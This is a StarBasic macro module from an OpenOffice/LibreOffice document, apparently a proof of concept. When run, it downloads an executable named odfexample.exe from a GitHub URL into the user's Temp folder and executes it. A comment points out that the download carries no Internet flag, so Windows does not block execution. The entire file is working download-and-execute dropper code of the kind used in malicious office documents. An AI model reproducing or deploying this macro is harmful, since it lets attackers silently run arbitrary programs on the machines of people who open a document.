<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Sub Main
	
	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	Dim oSvc as object
	
  	oSvc = createUNOService(&quot;com.sun.star.system.SystemShellExecute&quot;)
	oSFA = createUNOService (&quot;com.sun.star.ucb.SimpleFileAccess&quot;)
	
	sFilePath = &quot;C:\Users\&quot; + environ(&quot;USERNAME&quot;) + &quot;\AppData\Local\Temp\odfexample.exe&quot;
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) &apos;if file exists, delete it
	End If
	
	DownloadFile(&quot;https://github.com/attodf/odf-test/raw/main/odfexample.exe&quot;, sFilePath)
	Beep
	oSvc.execute(ConvertToUrl(sFilePath), &quot;&quot;, 0)
	REM No Internet flag is set and thus the execution is not blocked.
	
End Sub

	Private Declare Function URLDownloadToFile Lib &quot;urlmon&quot; Alias &quot;URLDownloadToFileA&quot; _
                       (ByVal pCaller As Long, _
                        ByVal szURL As String, _
                        ByVal szFileName As String, _
                        ByVal dwReserved As Long, _
                        ByVal lpfnCB As Long) As Long
                        

	Public Function DownloadFile (URL As String, LocalFilename As String) As Boolean 
	    Dim lngRetVal As Long
	    lngRetVal = URLDownloadToFile(0, URL, LocalFilename, 0, 0) 
	    If lngRetVal = 0 Then DownloadFile = True 
	End Function &apos; DownloadFile
</script:module>